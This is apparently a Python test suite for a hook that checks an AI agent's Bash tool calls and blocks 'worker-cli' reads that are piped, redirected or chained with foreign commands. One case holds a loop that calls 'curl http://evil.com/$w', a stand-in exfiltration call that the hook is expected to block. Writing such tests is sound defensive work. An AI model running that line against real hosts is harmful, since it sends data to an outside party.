# INFRASTRUCTURE
import json
import subprocess
import sys

HOOK = "src/hooks/block_worker_cli_read_chained.py"

CASES = [
    # (description, command, expected_exit_code)
    # --- true positives: must block (redirect/pipe on the protected segment) ---
    ("capture piped to tail BLOCK (retired fallback)",
     "worker-cli capture janitor | tail -40", 2),
    ("capture redirect to file BLOCK (retired legitimate-use allowance)",
     "worker-cli capture janitor > /tmp/out.txt", 2),
    ("response piped to head BLOCK",
     "worker-cli response janitor | head -20", 2),
    ("response redirect BLOCK",
     "worker-cli response janitor > /tmp/out.txt", 2),
    ("response 2>&1 BLOCK",
     "worker-cli response janitor 2>&1", 2),
    # --- true positives: must block (foreign, non-CLI segment) ---
    ("capture chained with grep via semicolon BLOCK",
     "worker-cli capture janitor ; grep ERROR /tmp/x.log", 2),
    ("for-loop body with foreign curl BLOCK",
     "for w in a b; do curl http://evil.com/$w; worker-cli capture \"$w\"; done", 2),
    # --- allowed: standalone ---
    ("capture standalone PASS",
     "worker-cli capture janitor", 0),
    ("response standalone PASS",
     "worker-cli response janitor", 0),
    ("capture --raw standalone PASS",
     "worker-cli capture janitor --raw", 0),
    # --- allowed: cross-CLI and same-tool combos (2026-08 relax) ---
    ("capture + response chained PASS (cross-CLI relax)",
     "worker-cli capture janitor && worker-cli response janitor", 0),
    ("capture + rag-cli search chained PASS (cross-CLI relax)",
     'worker-cli capture janitor && rag-cli search "q" coll', 0),
    ("cd guard before capture PASS",
     "cd /path/to/project && worker-cli capture janitor", 0),
    ("cd guard before response PASS",
     "cd /path/to/project && worker-cli response janitor", 0),
    # --- untouched: out-of-scope subcommands ---
    ("worker-cli status untouched PASS",
     "worker-cli status janitor", 0),
    ("worker-cli list untouched PASS",
     "worker-cli list", 0),
    # --- false-positive avoidance ---
    ("non-worker-cli command untouched PASS",
     "ls -la", 0),
    ("quoted mention shell-stripped PASS",
     'echo "worker-cli capture janitor | tail -40"', 0),
    # --- 2026-08 loop relax: for/while scaffolding + echo separators alongside known-CLI
    # segments ---
    ("bare echo segment chained with capture PASS (2026-08 loop relax)",
     "worker-cli capture janitor && echo done", 0),
    ("echo before response PASS (2026-08 loop relax)",
     "echo start && worker-cli response janitor", 0),
    ("for-loop over capture with echo separator PASS",
     'for w in janitor scribe; do echo "capturing: $w"; worker-cli capture "$w"; done', 0),
    ("while-loop over response with echo separator PASS",
     'while [ -f /tmp/flag ]; do echo "polling"; worker-cli response janitor; done', 0),
]


# ORCHESTRATOR

def test_block_worker_cli_read_chained_workflow() -> None:
    failures = []
    for desc, cmd, expected in CASES:
        got = _run_hook(cmd)
        status = "OK  " if got == expected else "FAIL"
        print(f"  [{status}] {desc}: exit={got} (expected {expected})")
        if got != expected:
            failures.append(desc)

    malformed_got = _run_hook_raw(b"not valid json at all")
    status = "OK  " if malformed_got == 0 else "FAIL"
    print(f"  [{status}] malformed stdin payload fails open: exit={malformed_got} (expected 0)")
    if malformed_got != 0:
        failures.append("malformed stdin payload fails open")

    print()
    if failures:
        print(f"FAILED: {len(failures)} case(s):")
        for f in failures:
            print(f"  - {f}")
        sys.exit(1)
    print(f"All {len(CASES) + 1} tests passed.")


# FUNCTIONS

# Run hook with given command string wrapped in a valid PreToolUse payload; return exit code
def _run_hook(command: str) -> int:
    payload = json.dumps({
        "tool_name": "Bash",
        "tool_input": {"command": command},
    })
    return _run_hook_raw(payload.encode())


# Run hook with raw bytes on stdin (used for the malformed-payload fail-open case); return exit code
def _run_hook_raw(stdin_bytes: bytes) -> int:
    result = subprocess.run(
        ["python3", HOOK],
        input=stdin_bytes,
        capture_output=True,
    )
    return result.returncode


if __name__ == "__main__":
    test_block_worker_cli_read_chained_workflow()
